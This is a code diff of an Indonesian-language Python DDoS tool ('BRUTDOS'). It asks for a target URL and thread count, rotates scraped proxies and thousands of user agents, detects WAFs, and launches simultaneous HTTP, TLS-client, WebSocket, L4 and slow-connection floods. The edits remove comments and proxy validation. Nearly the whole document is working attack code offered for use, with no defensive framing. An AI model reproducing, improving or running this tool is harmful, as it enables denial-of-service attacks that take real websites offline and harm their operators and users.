@@ -1,4 +1,6 @@
-#BRUTALDDOS
+#CODECBYRIZXDEV
+#BRUTDOS
+
 
 import requests, httpx, threading, random, string, time, socket, os, ssl, re
 from tls_client import Session
@@ -7,7 +9,6 @@ from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor
 from threading import Lock, Thread
 
-# === KONFIGURASI DASAR ===
 TARGET_URL = input("🔗 URL Target (https://example.com): ").strip().rstrip("/")
 MAX_THREADS = int(input("🧵 Jumlah Threads: "))
 ENABLE_VIEW = input("👁️ Aktifkan Spam View? (y/n): ").strip().lower() == 'y'
@@ -19,7 +20,6 @@ TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)
 TARGET_PORT = 443 if parsed.scheme == 'https' else 80
 print(f"✅ Target IP: {TARGET_IP}:{TARGET_PORT}")
 
-# === VARIABEL GLOBAL ===
 sukses = gagal = view_sent = l4_sent = slow_conn = total_req = 0
 last_status_code = 0
 target_status = "🟢 OKE"
@@ -27,7 +27,6 @@ spoof_mode = False
 lock = Lock()
 active_proxies = {}
 
-# 💣 USER AGENT LOADER OTOMATIS
 USER_AGENTS = []
 ua_file = "10k-user-agent.txt"
 
@@ -50,7 +49,6 @@ if os.path.exists(ua_file):
 else:
     print("⚠️ File 10k-user-agent.txt tidak ditemukan, pakai User-Agent default.")
 
-# === PROXY LOADER ===
 PROXIES = []
 
 def load_proxies():
@@ -73,27 +71,11 @@ def load_proxies():
         except Exception as e:
             print(f"⚠️ Gagal ambil dari {url}: {e}")
 
-    print(f"🔎 Total proxy ditemukan: {len(PROXIES)}")
-
-    # Validasi proxy
-    validated = []
-    print("🔍 Validasi proxy...")
-    for p in PROXIES:
-        try:
-            r = requests.get("http://httpbin.org/ip", proxies={"http": f"http://{p}", "https": f"http://{p}"}, timeout=3)
-            if r.status_code == 200:
-                validated.append(p)
-        except:
-            continue
-
-    PROXIES.clear()
-    PROXIES.extend(validated)
-    print(f"✅ Proxy tervalidasi & siap pakai: {len(PROXIES)}")
+    print(f"✅ Total proxy dimuat tanpa validasi: {len(PROXIES)}")
 
 if USE_PROXY:
     load_proxies()
 
-# === UTILITAS ===
 def kotak(text):
     lines = text.strip().split("\n")
     panjang = max(len(line) for line in lines)
@@ -141,7 +123,6 @@ def get_proxy():
         return {"http": f"http://{random.choice(PROXIES)}", "https": f"http://{random.choice(PROXIES)}"}
     return None
 
-# === WAF DETECTION ===
 def detect_waf():
     global spoof_mode
     try:
@@ -154,7 +135,6 @@ def detect_waf():
     except:
         print("⚠️ Gagal cek WAF, lanjut default...")
 
-# === VECTORS === (semua jalan bareng, bukan gantian)
 def request_with_proxy(func):
     def wrapper():
         proxy = get_proxy()
@@ -194,7 +174,9 @@ def attack_tls_client(proxy):
 @request_with_proxy
 def attack_ws(proxy):
     global sukses, gagal, total_req
-    ws = create_connection(TARGET_URL.replace("http", "ws"), timeout=5, http_proxy_host=proxy['http'].split(':')[1][2:] if proxy else None, http_proxy_port=int(proxy['http'].split(':')[2]) if proxy else None)
+    ws = create_connection(TARGET_URL.replace("http", "ws"), timeout=5,
+        http_proxy_host=proxy['http'].split(':')[1][2:] if proxy else None,
+        http_proxy_port=int(proxy['http'].split(':')[2]) if proxy else None)
     ws.send(gen_data())
     with lock:
         sukses += 1
